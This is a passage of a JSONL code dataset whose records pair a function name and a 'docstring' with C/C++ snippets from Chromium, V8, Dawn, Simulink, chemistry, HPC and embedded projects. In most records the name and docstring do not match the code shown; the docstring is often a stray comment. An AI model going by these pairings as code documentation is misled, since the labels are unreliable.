GetSessionRoute(id, item, profile);\\n  UpdateMediaSessionItemReceiverName(item, route);\\n  if (!route.has_value()) {\\n    return nullptr;\\n  }\\n\\n  const auto& route_id = route->media_route_id();\\n  auto cast_mode = HasRemotePlaybackRoute(item)\\n                       ? media_router::MediaCastMode::REMOTE_PLAYBACK\\n                       : media_router::MediaCastMode::TAB_MIRROR;\\n\\n  auto stop_casting_cb = base::BindRepeating(\\n      [](const std::string& route_id, media_router::MediaRouter* router,\\n         global_media_controls::GlobalMediaControlsEntryPoint entry_point,\\n         media_router::MediaCastMode cast_mode) {\\n        router->TerminateRoute(route_id);\\n        MediaItemUIMetrics::RecordStopCastingMetrics(cast_mode, entry_point);\\n        if (cast_mode == media_router::MediaCastMode::TAB_MIRROR) {\\n          MediaDialogView::HideDialog();\\n        }\\n      },\\n      route_id,\\n      media_router::MediaRouterFactory::GetApiForBrowserContext(profile),\\n      entry_point, cast_mode);\\n  return std::make_unique<MediaItemUILegacyCastFooterView>(\\n      std::move(stop_casting_cb));\\n}'}","id":1770}
{"content":"{'function_name': 'display_dash_y_options', 'docstring': '\/\/os << \" -\" << flag << \" B4F=<fname>   write frag stripped smiles before filtering to <fname> \\\\n\";', 'code': 'static int\\nis_azide (const Molecule & m,\\n          atom_number_t n1,\\n          int * ngroup)\\n{\\n  const Atom * an1 = m.atomi(n1);\\n\\n  atom_number_t n2 = an1->other(n1, 0);\\n\\n  const Atom * an2 = m.atomi(n2);\\n\\n  if (7 != an2->atomic_number())\\n    return 0;\\n\\n  if (2 != an2->ncon())\\n    return 0;\\n\\n  atom_number_t n3 = an2->other(n2, 0);\\n  if (n3 == n1)\\n    n3 = an2->other(n2, 1);\\n\\n  if (7 != m.atomic_number(n3))\\n    return 0;\\n\\n  if (2 != m.ncon(n3))\\n    return 0;\\n\\n\/\/ We have 3 nitrogens. They must be [N-]=[N+]=N or N#N=N\\n\\n  const Bond * b12 = an1->item(0);\\n  const Bond * b23 = an2->item(0);\\n  if (n1 == b23->other(n2))\\n    b23 = an2->item(1);\\n\\n  if (! b23->is_double_bond())\\n    return 0;\\n\\n  if (b12->is_triple_bond())\\n    ;\\n  else if (b12->is_double_bond() && -1 == an1->formal_charge() && 1 == an2->formal_charge())\\n    ;\\n  else\\n    return 0;\\n\\n  ngroup[n1] = n1 + 1;\\n  ngroup[n2] = n1 + 1;\\n  ngroup[n3] = n1 + 1;\\n\\n  return 1;\\n}'}","id":1771}
{"content":"{'function_name': 'TEST_F', 'docstring': '\/\/ AIA OCSP url is included, but does not return a successful ocsp response.', 'code': 'TEST_F(HTTPSOCSPTest, RevokedStapled) {\\n  if (!SystemSupportsOCSPStapling()) {\\n    LOG(WARNING)\\n        << \"Skipping test because system doesn\\'t support OCSP stapling\";\\n    return;\\n  }\\n\\n  EmbeddedTestServer::ServerCertificateConfig cert_config;\\n\\n  \/\/ AIA OCSP url is included, but does not return a successful ocsp response.\\n  cert_config.ocsp_config = EmbeddedTestServer::OCSPConfig(\\n      EmbeddedTestServer::OCSPConfig::ResponseType::kTryLater);\\n\\n  cert_config.stapled_ocsp_config = EmbeddedTestServer::OCSPConfig(\\n      {{OCSPRevocationStatus::REVOKED,\\n        EmbeddedTestServer::OCSPConfig::SingleResponse::Date::kValid}});\\n\\n  CertStatus cert_status;\\n  DoConnection(cert_config, &cert_status);\\n\\n  EXPECT_EQ(CERT_STATUS_REVOKED, cert_status & CERT_STATUS_ALL_ERRORS);\\n  EXPECT_TRUE(cert_status & CERT_STATUS_REV_CHECKING_ENABLED);\\n}'}","id":1773}
{"content":"{'function_name': 'denoiseb_rd44_select', 'docstring': '\/\/__VIVADO_SYNTH__', 'code': 'inline hw_uint<16> denoiseb_rd45_select(raw_cache& raw, int d0, int d1) {\\n#ifdef __VIVADO_SYNTH__\\n#endif \/\/__VIVADO_SYNTH__\\n  \/\/ denoiseb_rd45 read pattern: { denoiseb_update_0[d0, d1] -> raw[3 + 2d0, -2 + d1] : -1 <= d0 <= 961 and -1 <= d1 <= 1082 }\\n  \/\/ Read schedule : { denoiseb_update_0[d0, d1] -> [2 + d1, 1 + d0, 2] : -1 <= d0 <= 961 and -1 <= d1 <= 1082 }\\n  \/\/ Write schedule: { raw_update_0[d0, d1] -> [d1, d0, 1] : -2 <= d0 <= 962 and -3 <= d1 <= 1084 }\\n  \/\/ DD fold: { denoiseb_update_0[d0, d1] -> 3860 : -1 <= d0 <= 960 and -1 <= d1 <= 1082; denoiseb_update_0[d0, d1] -> (2899 + d0) : d0 = 961 and -1 <= d1 <= 1082 }\\n  auto value_raw_raw_update_0_write1 = raw.raw_raw_update_0_write1_merged_banks_25.peek_3860();\\n  return value_raw_raw_update_0_write1;\\n#ifndef __VIVADO_SYNTH__\\n\\tcout << \"Error: Unsupported offsets: \" << \" d0 = \" << d0  << \" d1 = \" << d1  << endl;\\n\\tassert(false);\\n\\treturn 0;\\n#endif \/\/__VIVADO_SYNTH__\\n}'}","id":1774}
{"content":"{'function_name': 'CallMe', 'docstring': '\/\/(ppthis->*m)(0);', 'code': 'int _tmain(int argc, _TCHAR* argv[])\\n{\\n    A a;\\n    B b;\\n    A *pa = &b;\\n\\n    SpyOn(&A::M1);\\n    SpyOn(&A::M2);\\n    SpyOn(&B::M1);\\n    \/\/SpyOn(&B::M2);\\n    \/\/SpyOn(&B::M3);\\n    \/\/unsigned u = (unsigned *) & ((b.M2));\\n    \/\/TT(&B::M2, &b);\\n    SpyOnV(a, &A::M2);\\n    SpyOnV(b, &B::M2);\\n    SpyOnV(b, &B::M3);\\n\\n    a.M1(1);\\n    a.M2(2);\\n\\n    b.M1(3);\\n    b.M2(4);\\n\\n    pa->M1(5);\\n    pa->M2(6);\\n\\n    b.M3(7);\\n\\n\\n    DumpCalls();\\n\\n    return 0;\\n}'}","id":1775}
{"content":"{'function_name': 'ConvertWGSLToSPIRV', 'docstring': '\/\/ state between calls to avoid this.', 'code': 'MaybeError ValidateShaderModuleDescriptor(DeviceBase* device,\\n                                              const ShaderModuleDescriptor* descriptor) {\\n        const ChainedStruct* chainedDescriptor = descriptor->nextInChain;\\n        if (chainedDescriptor == nullptr) {\\n            return DAWN_VALIDATION_ERROR(\"Shader module descriptor missing chained descriptor\");\\n        }\\n        \/\/ For now only a single SPIRV or WGSL subdescriptor is allowed.\\n        if (chainedDescriptor->nextInChain != nullptr) {\\n            return DAWN_VALIDATION_ERROR(\\n                \"Shader module descriptor chained nextInChain must be nullptr\");\\n        }\\n\\n        switch (chainedDescriptor->sType) {\\n            case wgpu::SType::ShaderModuleSPIRVDescriptor: {\\n                const auto* spirvDesc =\\n                    static_cast<const ShaderModuleSPIRVDescriptor*>(chainedDescriptor);\\n                DAWN_TRY(ValidateSpirv(device, spirvDesc->code, spirvDesc->codeSize));\\n                break;\\n            }\\n\\n            case wgpu::SType::ShaderModuleWGSLDescriptor: {\\n#ifdef DAWN_ENABLE_WGSL\\n                const auto* wgslDesc =\\n                    static_cast<const ShaderModuleWGSLDescriptor*>(chainedDescriptor);\\n                DAWN_TRY(ValidateWGSL(wgslDesc->source));\\n                break;\\n#else\\n                return DAWN_VALIDATION_ERROR(\"WGSL not supported (yet)\");\\n#endif  \/\/ DAWN_ENABLE_WGSL\\n            }\\n            default:\\n                return DAWN_VALIDATION_ERROR(\"Unsupported sType\");\\n        }\\n\\n        return {};\\n    }'}","id":1778}
{"content":"{'function_name': 'mdlCheckParameters', 'docstring': '\/* All parameters must match the S-function Builder Dialog *\/', 'code': 'static void mdlInitializeSizes(SimStruct *S)\\n{\\n\\n    DECL_AND_INIT_DIMSINFO(inputDimsInfo);\\n    DECL_AND_INIT_DIMSINFO(outputDimsInfo);\\n    ssSetNumSFcnParams(S, NPARAMS);  \/* Number of expected parameters *\/\\n      #if defined(MATLAB_MEX_FILE)\\n\\tif (ssGetNumSFcnParams(S) == ssGetSFcnParamsCount(S)) {\\n\\t  mdlCheckParameters(S);\\n\\t  if (ssGetErrorStatus(S) != NULL) {\\n\\t    return;\\n\\t  }\\n\\t } else {\\n\\t   return; \/* Parameter mismatch will be reported by Simulink *\/\\n\\t }\\n      #endif\\n\\n    ssSetNumContStates(S, NUM_CONT_STATES);\\n    ssSetNumDiscStates(S, NUM_DISC_STATES);\\n\\n    if (!ssSetNumInputPorts(S, NUM_INPUTS)) return;\\n    \/*Input Port 0 *\/\\n    ssSetInputPortWidth(S,  0, INPUT_0_WIDTH); \/* *\/\\n    ssSetInputPortDataType(S, 0, SS_DOUBLE);\\n    ssSetInputPortComplexSignal(S,  0, INPUT_0_COMPLEX);\\n    ssSetInputPortDirectFeedThrough(S, 0, INPUT_0_FEEDTHROUGH);\\n    ssSetInputPortRequiredContiguous(S, 0, 1); \/*direct input signal access*\/\\n\\n    \/*Input Port 1 *\/\\n    ssSetInputPortWidth(S,  1, INPUT_1_WIDTH); \/* *\/\\n    ssSetInputPortDataType(S, 1, SS_DOUBLE);\\n    ssSetInputPortComplexSignal(S,  1, INPUT_1_COMPLEX);\\n    ssSetInputPortDirectFeedThrough(S, 1, INPUT_1_FEEDTHROUGH);\\n    ssSetInputPortRequiredContiguous(S, 1, 1); \/*direct input signal access*\/\\n\\n    \/*Input Port 2 *\/\\n    ssSetInputPortWidth(S,  2, INPUT_2_WIDTH); \/* *\/\\n    ssSetInputPortDataType(S, 2, SS_DOUBLE);\\n    ssSetInputPortComplexSignal(S,  2, INPUT_2_COMPLEX);\\n    ssSetInputPortDirectFeedThrough(S, 2, INPUT_2_FEEDTHROUGH);\\n    ssSetInputPortRequiredContiguous(S, 2, 1); \/*direct input signal access*\/\\n\\n\\n    if (!ssSetNumOutputPorts(S, NUM_OUTPUTS)) return;\\n    \/* Output Port 0 *\/\\n    ssSetOutputPortWidth(S, 0, OUTPUT_0_WIDTH);\\n    ssSetOutputPortDataType(S, 0, SS_DOUBLE);\\n    ssSetOutputPortComplexSignal(S, 0, OUTPUT_0_COMPLEX);\\n    \/* Output Port 1 *\/\\n    ssSetOutputPortWidth(S, 1, OUTPUT_1_WIDTH);\\n    ssSetOutputPortDataType(S, 1, SS_DOUBLE);\\n    ssSetOutputPortComplexSignal(S, 1, OUTPUT_1_COMPLEX);\\n    \/* Output Port 2 *\/\\n    ssSetOutputPortWidth(S, 2, OUTPUT_2_WIDTH);\\n    ssSetOutputPortDataType(S, 2, SS_DOUBLE);\\n    ssSetOutputPortComplexSignal(S, 2, OUTPUT_2_COMPLEX);\\n    \/* Output Port 3 *\/\\n    ssSetOutputPortWidth(S, 3, OUTPUT_3_WIDTH);\\n    ssSetOutputPortDataType(S, 3, SS_DOUBLE);\\n    ssSetOutputPortComplexSignal(S, 3, OUTPUT_3_COMPLEX);\\n    \/* Output Port 4 *\/\\n    ssSetOutputPortWidth(S, 4, OUTPUT_4_WIDTH);\\n    ssSetOutputPortDataType(S, 4, SS_DOUBLE);\\n    ssSetOutputPortComplexSignal(S, 4, OUTPUT_4_COMPLEX);\\n    \/* Output Port 5 *\/\\n    ssSetOutputPortWidth(S, 5, OUTPUT_5_WIDTH);\\n    ssSetOutputPortDataType(S, 5, SS_DOUBLE);\\n    ssSetOutputPortComplexSignal(S, 5, OUTPUT_5_COMPLEX);\\n    \/* Output Port 6 *\/\\n    ssSetOutputPortWidth(S, 6, OUTPUT_6_WIDTH);\\n    ssSetOutputPortDataType(S, 6, SS_DOUBLE);\\n    ssSetOutputPortComplexSignal(S, 6, OUTPUT_6_COMPLEX);\\n    \/* Output Port 7 *\/\\n    ssSetOutputPortWidth(S, 7, OUTPUT_7_WIDTH);\\n    ssSetOutputPortDataType(S, 7, SS_DOUBLE);\\n    ssSetOutputPortComplexSignal(S, 7, OUTPUT_7_COMPLEX);\\n    \/* Output Port 8 *\/\\n    ssSetOutputPortWidth(S, 8, OUTPUT_8_WIDTH);\\n    ssSetOutputPortDataType(S, 8, SS_DOUBLE);\\n    ssSetOutputPortComplexSignal(S, 8, OUTPUT_8_COMPLEX);\\n    \/* Output Port 9 *\/\\n    ssSetOutputPortWidth(S, 9, OUTPUT_9_WIDTH);\\n    ssSetOutputPortDataType(S, 9, SS_DOUBLE);\\n    ssSetOutputPortComplexSignal(S, 9, OUTPUT_9_COMPLEX);\\n    \/* Output Port 10 *\/\\n    ssSetOutputPortWidth(S, 10, OUTPUT_10_WIDTH);\\n    ssSetOutputPortDataType(S, 10, SS_DOUBLE);\\n    ssSetOutputPortComplexSignal(S, 10, OUTPUT_10_COMPLEX);\\n    \/* Output Port 11 *\/\\n    ssSetOutputPortWidth(S, 11, OUTPUT_11_WIDTH);\\n    ssSetOutputPortDataType(S, 11, SS_DOUBLE);\\n    ssSetOutputPortComplexSignal(S, 11, OUTPUT_11_COMPLEX);\\n\\n    ssSetNumSampleTimes(S, 1);\\n    ssSetNumRWork(S, 0);\\n    ssSetNumIWork(S, 0);\\n    ssSetNumPWork(S, 0);\\n    ssSetNumModes(S, 0);\\n    ssSetNumNonsampledZCs(S, 0);\\n\\n    ssSetSimulinkVersionGeneratedIn(S, \"8.6\");\\n\\n    \/* Take care when specifying exception free code - see sfuntmpl_doc.c *\/\\n    ssSetOptions(S, (SS_OPTION_EXCEPTION_FREE_CODE |\\n                     SS_OPTION_USE_TLC_WITH_ACCELERATOR | \\n\\t\\t     SS_OPTION_WORKS_WITH_CODE_REUSE));\\n}'}","id":1781}
{"content":"{'function_name': 'err_print', 'docstring': '\/\/change back print color', 'code': 'BOOL create_window(HINSTANCE hInst, int nCmd, LPCSTR str_classname, LPCSTR str_windowname, int width, int height, HWND *hWnd_out, WNDPROC wnd_proc)\\n\\t{\\n\\t\\t\/\/initialize hwnd and wndclassex\\n\\t\\tHWND hWnd;\\n\\t\\tWNDCLASSEX wcex;\\n\\t\\tZeroMemory(&wcex, sizeof(WNDCLASSEX));\\n\\t\\twcex.cbSize = sizeof(wcex);\\n\\t\\twcex.style = CS_HREDRAW | CS_VREDRAW;\\n\\t\\twcex.lpfnWndProc = wnd_proc;\\n\\t\\twcex.hInstance = hInst;\\n\\t\\twcex.hIcon = LoadIcon(NULL, IDI_APPLICATION);\\n\\t\\twcex.hCursor = LoadCursor(NULL, IDC_ARROW);\\n\\t\\twcex.hbrBackground = (HBRUSH)COLOR_WINDOW;\\n\\t\\twcex.lpszClassName = str_classname;\\n\\t\\twcex.hIconSm = LoadIcon(NULL, IDI_WINLOGO);\\n\\n\\t\\t\/\/register the wndclass\\n\\t\\tif (!RegisterClassEx(&wcex))\\n\\t\\t\\treturn FALSE;\\n\\n\\t\\t\/\/create the window\\n\\t\\thWnd = CreateWindowEx(NULL, str_classname, str_windowname, WS_OVERLAPPED | WS_CAPTION | WS_SYSMENU, (GetSystemMetrics(SM_CXSCREEN) - width) \/ 2,\\n\\t\\t\\t(GetSystemMetrics(SM_CYSCREEN) - height) \/ 2, width, height, NULL, NULL, hInst, NULL);\\n\\n\\t\\tShowWindow(hWnd, nCmd);\\n\\t\\t*hWnd_out = hWnd;\\n\\t\\treturn TRUE;\\n\\t}'}","id":1784}
{"content":"{'function_name': 'BuildCaller', 'docstring': '\/\/ The first parameter is always the callee.', 'code': 'Handle<Code> BuildSetupFunction(Isolate* isolate,\\n                                CallDescriptor* caller_descriptor,\\n                                CallDescriptor* callee_descriptor) {\\n  CodeAssemblerTester tester(isolate, 0);\\n  CodeStubAssembler assembler(tester.state());\\n  std::vector<Node*> params;\\n  \/\/ The first parameter is always the callee.\\n  params.push_back(__ HeapConstant(\\n      BuildCaller(isolate, caller_descriptor, callee_descriptor)));\\n  \/\/ Set up arguments for \"Caller\".\\n  int param_count = static_cast<int>(caller_descriptor->StackParameterCount());\\n  for (int i = 0; i < param_count; ++i) {\\n    \/\/ Use values that are different from the ones we will pass to this\\n    \/\/ function\\'s callee later.\\n    params.push_back(__ IntPtrConstant(i + 42));\\n  }\\n  DCHECK_EQ(param_count + 1, params.size());\\n  Node* raw_result = tester.raw_assembler_for_testing()->CallN(\\n      caller_descriptor, param_count + 1, params.data());\\n  __ Return(__ SmiTag(raw_result));\\n  return tester.GenerateCodeCloseAndEscape();\\n}'}","id":1789}
{"content":"{'function_name': 'TEST_F', 'docstring': '\/\/ Should trigger |job| to be started.', 'code': 'TEST_F(URLRequestTestHTTP, NetworkCancelAfterCreateTransactionFailsTest) {\\n  auto context_builder = CreateTestURLRequestContextBuilder();\\n  context_builder->SetCreateHttpTransactionFactoryCallback(\\n      base::BindOnce([](HttpNetworkSession* session) {\\n        std::unique_ptr<HttpTransactionFactory> factory =\\n            std::make_unique<FailingHttpTransactionFactory>(session);\\n        return factory;\\n      }));\\n  auto& network_delegate = *context_builder->set_network_delegate(\\n      std::make_unique<TestNetworkDelegate>());\\n  auto context = context_builder->Build();\\n\\n  TestDelegate d;\\n  std::unique_ptr<URLRequest> req(\\n      context->CreateRequest(GURL(\"http:\/\/127.0.0.1\/\"), DEFAULT_PRIORITY, &d,\\n                             TRAFFIC_ANNOTATION_FOR_TESTS));\\n  \/\/ Don\\'t send cookies (Collecting cookies is asynchronous, and need request to\\n  \/\/ try to create an HttpNetworkTransaction synchronously on start).\\n  req->set_allow_credentials(false);\\n  req->Start();\\n  req->Cancel();\\n  d.RunUntilComplete();\\n  \/\/ Run pending error task, if there is one.\\n  base::RunLoop().RunUntilIdle();\\n\\n  EXPECT_TRUE(d.request_failed());\\n  EXPECT_EQ(1, d.response_started_count());\\n  EXPECT_EQ(ERR_ABORTED, d.request_status());\\n\\n  \/\/ NetworkDelegate should see the cancellation, but not the error.\\n  EXPECT_EQ(1, network_delegate.canceled_requests());\\n  EXPECT_EQ(0, network_delegate.error_count());\\n}'}","id":1790}
{"content":"{'function_name': 'setup', 'docstring': '\/\/ Only For debug', 'code': 'String searchCameraSSID() {\\n    String cameraSSID;\\n \\n    \/\/ Set WiFi to station mode and disconnect from an AP if it was previously connected\\n    WiFi.mode(WIFI_STA);\\n    WiFi.disconnect();\\n    delay(100);\\n \\n    \/\/ WiFi.scanNetworks will return the number of networks found\\n    int n = WiFi.scanNetworks();\\n    if (n > 0) {\\n        for (int i = 0; i < n; ++i) {\\n            \/\/ Search Camera network\\n            if (WiFi.SSID(i).startsWith(\"YDXJ_\")) {\\n                cameraSSID = WiFi.SSID(i);\\n                Serial.println(\"SSID Found\");\\n                break;\\n            }\\n            delay(10);\\n        }\\n    }\\n \\n    return cameraSSID;\\n}'}","id":1794}
{"content":"{'function_name': 'ErrDBCloseDatabase', 'docstring': '\/\/  detached.', 'code': 'ERR ErrDBOpenDatabaseByIfmp( PIB *ppib, IFMP ifmp )\\n{\\n    ERR     err;\\n\\n    \/\/  Write latch the fmp since we are going to change cPin.\\n\\n    CallR( FMP::ErrWriteLatchByIfmp( ifmp, ppib ) );\\n\\n    \/\/  The fmp we latch must be write latched by us and have\\n    \/\/  a attached database.\\n\\n    FMP *pfmp = &g_rgfmp[ ifmp ];\\n    Assert( pfmp->FWriteLatchByMe(ppib) );\\n    Assert( pfmp->FAttached() );\\n\\n\\n    \/\/ Allow LV create, RCE clean, and OLD sessions to bypass exclusive lock.\\n    if ( pfmp->FExclusiveByAnotherSession( ppib )\\n        && !FPIBSessionLV( ppib )\\n        && !FPIBSessionSystemCleanup( ppib ) )\\n    {\\n        \/\/  It is opened by others already.\\n        err = ErrERRCheck( JET_errDatabaseLocked );\\n    }\\n    else\\n    {\\n        DBSetOpenDatabaseFlag( ppib, ifmp );\\n\\n        if ( ppib->FSessionOLD() && !pfmp->FRunningOLD() )\\n        {\\n            Assert( !pfmp->FDontStartOLD() );\\n            pfmp->SetRunningOLD();\\n        }\\n\\n        err = JET_errSuccess;\\n    }\\n\\n    pfmp->ReleaseWriteLatch( ppib );\\n\\n    return err;\\n}'}","id":1800}
{"content":"{'function_name': 'norm', 'docstring': '\/\/Euclidean norm', 'code': 'bool intersect(const ray& r, const triangle& tri, point& intersection) {\\n    \/\/ Vorgehen nach http:\/\/wwwcg.in.tum.de\/Teaching\/SS2007\/Proseminar\/Workouts\/data\/Florian_Ferstl.pdf\\n\\t\/\/ Hilfsvariablen berechnen\\n\\tpoint d = r.direction;\\n\\tpoint o = r.location;\\n\\t\\n\\tnormalize (d); \\n\\t\\n\\tpoint e1 = tri.b - tri.a;\\n\\tpoint e2 = tri.c - tri.a;\\n\\t\\n\\t\/\/ erstes Kreuzpordukt und erste Pr\u00fcfung\\n\\tpoint p = cross (d,e2);\\n\\tfloat D = dot (p, e1);\\n\\t\\n\\tif (D == 0) {\\n\\t\\treturn false; \/\/ Strahl parallel zur Dreiecksebene\\n\\t} else {\\n\\t\\tfloat D_inv = 1 \/ D;\\n\\t\\tpoint t = o - tri.a;\\n\\t\\tfloat alpha = dot (p,t) * D_inv;\\n\\t\\tif ( (alpha < 0) | (alpha > 1) ) {\\n\\t\\t\\treturn false; \/\/ Strahl kann dreiecksebene nichtmehr schneiden\\n\\t\\t} else {\\n\\t\\t\\t\/\/ zweites kreuzpordukt und zweite Pr\u00fcfung\\n\\t\\t\\tpoint q = cross (t, e1);\\n\\t\\t\\tfloat beta = dot (q,d) * D_inv;\\n\\t\\t\\tif ( (beta < 0) | ( (beta + alpha) > 1)) {\\n\\t\\t\\t\\treturn false; \\n\\t\\t\\t} else {\\n\\t\\t\\t\\tfloat lamda = dot (q, e2) * D_inv;\\n\\t\\t\\t\\tif (lamda > 0) {\\n\\t\\t\\t\\t\\tintersection = o + lamda * d; \\n\\t\\t\\t\\t\\treturn true;\\n\\t\\t\\t\\t} else {\\n\\t\\t\\t\\t\\treturn false;\\n\\t\\t\\t\\t}\\n\\t\\t\\t}\\n\\t\\t}\\n\\t}\\n}'}","id":1804}
{"content":"{'function_name': 'refine_interface_pro', 'docstring': '\/*\\n    if( offset(msh,cl) == 118 )\\n        std::cout<<\"POINT INTERFACE Ip = \"<<ip <<  \" in pos = \"<<mid<<std::endl;\\n    *\/', 'code': 'typename cuthho_mesh<T, ET>::point_type\\nsearch_boundary3( cuthho_mesh<T, ET>& msh, typename cuthho_mesh<T, ET>::cell_type& cl, typename cuthho_mesh<T, ET>::point_type& p_init ,T m , T q , T lm , const Function& level_set , T iso_val_interface )\\n{\\n    typedef typename cuthho_mesh<T, ET>::point_type     point_type;\\n    auto pts = points(msh,cl);\\n    \\n    point_type pt_tmp0 = point_type( pts[0].x() , m* pts[0].x() + q ) ;\\n    point_type pt_tmp1 = point_type( pts[1].x() , m* pts[1].x() + q ) ;\\n    point_type pt_tmp2 = point_type( (pts[1].y()-q)\/m , pts[1].y() ) ;\\n    point_type pt_tmp3 = point_type( (pts[2].y()-q)\/m , pts[2].y() ) ;\\n    \/*\\n    if( offset(msh,cl) == 1029 || offset(msh,cl) == 1082 )\\n    {\\n        std::cout<<yellow<<bold<<\"search_boundary\"<<reset<<std::endl;\\n        std::cout<<\"pt_tmp0 = \"<<pt_tmp0<<std::endl;\\n        std::cout<<\"pt_tmp1 = \"<<pt_tmp1<<std::endl;\\n        std::cout<<\"pt_tmp2 = \"<<pt_tmp2<<std::endl;\\n        std::cout<<\"pt_tmp3 = \"<<pt_tmp3<<std::endl;\\n    }\\n    *\/\\n    auto ls0 = level_set(pt_tmp0,msh,cl);\\n    auto ls1 = level_set(pt_tmp1,msh,cl);\\n    auto ls2 = level_set(pt_tmp2,msh,cl);\\n    auto ls3 = level_set(pt_tmp3,msh,cl);\\n    \\n    if ( pt_in_cell(msh , pt_tmp0 , cl) && ( !((lm >= iso_val_interface && ls0 >= iso_val_interface) || (lm < iso_val_interface && ls0 < iso_val_interface)) ) )\\n        return pt_tmp0 ;\\n    if ( pt_in_cell(msh , pt_tmp1 , cl) && ( !((lm >= iso_val_interface && ls1 >= iso_val_interface) || (lm < iso_val_interface && ls1 < iso_val_interface)) ) )\\n    return pt_tmp1 ;\\n    if ( pt_in_cell(msh , pt_tmp2 , cl) && ( !((lm >= iso_val_interface && ls2 >= iso_val_interface) || (lm < iso_val_interface && ls2 < iso_val_interface)) ) )\\n    return pt_tmp2 ;\\n    if ( pt_in_cell(msh , pt_tmp3 , cl) && ( !((lm >= iso_val_interface && ls3 >= iso_val_interface) || (lm < iso_val_interface && ls3 < iso_val_interface)) ) )\\n    return pt_tmp3 ;\\n    else{\\n        std::cout<<\"In cell = \"<<offset(msh,cl)<<\" points(msh,cl)[0] = \"<<points(msh,cl)[0]<<\" points(msh,cl)[1] = \"<<points(msh,cl)[1]<<\" points(msh,cl)[2] = \"<<points(msh,cl)[2]<<\" points(msh,cl)[3] = \"<<points(msh,cl)[3] <<std::endl;\\n        std::cout<<\"m = \"<<m<<\" --> q = \"<<q<<std::endl;\\n        std::cout<<\"p_init = \"<<p_init<<\" --> pt_tmp0 = \"<<pt_tmp0<<\" , pt_tmp1 = \"<<pt_tmp1<<\" , pt_tmp2 = \"<<pt_tmp2<<\" , pt_tmp3 = \"<<pt_tmp3<<std::endl;\\n        std::cout<<\"ls0 = \"<<ls0<<\" , ls1 = \"<<ls1<<\" , ls2 = \"<<ls2<<\" , ls3 = \"<<ls3<<\" AND lm = \"<<lm<<std::endl;\\n        std::cout<<\"pt_in_cell( pt_tmp0 ) = \"<<pt_in_cell(msh , pt_tmp0 , cl)<<\" , pt_in_cell( pt_tmp1 ) = \"<<pt_in_cell(msh , pt_tmp1 , cl)<<\" , pt_in_cell( pt_tmp2 ) = \"<<pt_in_cell(msh , pt_tmp2 , cl)<<\" , pt_in_cel( pt_tmp3 ) = \"<<pt_in_cell(msh , pt_tmp3 , cl)<<std::endl;\\n        T pp = pts[0].x();\\n        T dist = std::abs( pp - p_init.x() )\/10.0;\\n        std::cout<<\"DIST = \"<<dist<< \" and pp = \"<<pp<< \" and p_init.x() = \"<<p_init.x() <<std::endl;\\n        point_type p0 = point_type( pp + dist , m* (pp-dist) + q ) ;\\n        point_type p1 = point_type( pp + (dist*2) , m* (pp+(dist*2)) + q ) ;\\n        point_type p2 = point_type( pp + (dist*3) , m* (pp+(dist*3)) + q ) ;\\n        point_type p3 = point_type( pp + (dist*4) , m* (pp+(dist*4)) + q ) ;\\n        point_type p4 = point_type( pp + (dist*5) , m* (pp+(dist*5)) + q ) ;\\n        point_type p5 = point_type( pp + (dist*6) , m* (pp+(dist*6)) + q ) ;\\n        point_type p6 = point_type( pp + (dist*7) , m* (pp+(dist*7)) + q ) ;\\n        point_type p7 = point_type( pp + (dist*8) , m* (pp+(dist*8)) + q ) ;\\n        point_type p8 = point_type( pp + (dist*9) , m* (pp+(dist*9)) + q ) ;\\n        std::cout<<\"p0 = \"<<p0<<\" , level_set = \"<<level_set(p0,msh,cl)<<\" , p1 = \"<<p1<<\" , level_set = \"<<level_set(p1,msh,cl)<<\" , p2 = \"<<p2<<\" , level_set = \"<<level_set(p2,msh,cl)<<\" , p3 = \"<<p3<<\" , level_set = \"<<level_set(p3,msh,cl)<<\" ,p4 = \"<<p4<<\" , level_set = \"<<level_set(p4,msh,cl)<<\" ,p5 = \"<<p5<<\" , level_set = \"<<level_set(p5,msh,cl)<<\" , p6 = \"<<p6<<\" , level_set = \"<<level_set(p6,msh,cl)<<\", p7 = \"<<p7<<\" , level_set = \"<<level_set(p7,msh,cl)<<\" , p8 = \"<<p8<<\" , level_set = \"<<level_set(p8,msh,cl)<<std::endl;\\n        \\n        \/\/throw std::logic_error(\"search_boundary not find -> Stefano\");\\n        \/\/return p_init ;\\n        \\n        point_type ret ;\\n        T val_min = 1e10;\\n        if( pt_in_cell(msh , pt_tmp0 , cl) && std::abs(ls0-iso_val_interface) < val_min )\\n        {\\n            val_min = std::abs(ls0) ;\\n            ret = pt_tmp0 ;\\n            \\n        }\\n        if( pt_in_cell(msh , pt_tmp1 , cl) && std::abs(ls1-iso_val_interface) < val_min )\\n        {\\n            val_min = std::abs(ls1) ;\\n            ret = pt_tmp1 ;\\n                \\n        }\\n        if( pt_in_cell(msh , pt_tmp2 , cl) && std::abs(ls2-iso_val_interface) < val_min )\\n        {\\n            val_min = std::abs(ls2) ;\\n            ret = pt_tmp2 ;\\n                \\n        }\\n        if( pt_in_cell(msh , pt_tmp3 , cl) && std::abs(ls3-iso_val_interface) < val_min )\\n        {\\n            val_min = std::abs(ls3) ;\\n            ret = pt_tmp3 ;\\n                \\n        }\\n        return ret;\\n            \\n    }\\n    \\n  \\n\\n}'}","id":1807}
{"content":"{'function_name': 'operate_obj', 'docstring': '\/\/p.drawPixmap(-center, sprite);', 'code': 'void operate_obj(Console::Objects::TBullet& obj, PAINT& p, TPool& pool, QPoint offset)\\n{\\n    Q_UNUSED(pool);\\n\\n    if (!obj.get_fired()) return;\\n\\n    printf(\"***paint BULLET %d %dx%d %d,%d\\\\n\", obj.get_id(), obj.get_width(), obj.get_height(), offset.x(), offset.y());\\n    \\n    QPixmap sprite = obj.get_sprite();\\n    QPointF center(sprite.width() \/ 2.0, sprite.height() \/ 2.0); \/\/ widget center\\n    \/\/QPointF new_pos = -center + obj.get_pos() + offset;\\n    QPointF new_pos = -center + obj.get_pos();\\n\\n    printf(\"\\\\tPOS %f, %f\\\\n\", new_pos.x(), new_pos.y());\\n\\n    \/\/QPointF new_pos(300.0, 50.0);\\n    \\n    p.save();\\n    \/\/ uncomment to trade performance for quality\\n    \/\/  painter.setRenderHint(QPainter::SmoothPixmapTransform);\\n    p.drawPixmap(new_pos, sprite);\\n    p.restore();\\n}'}","id":1808}
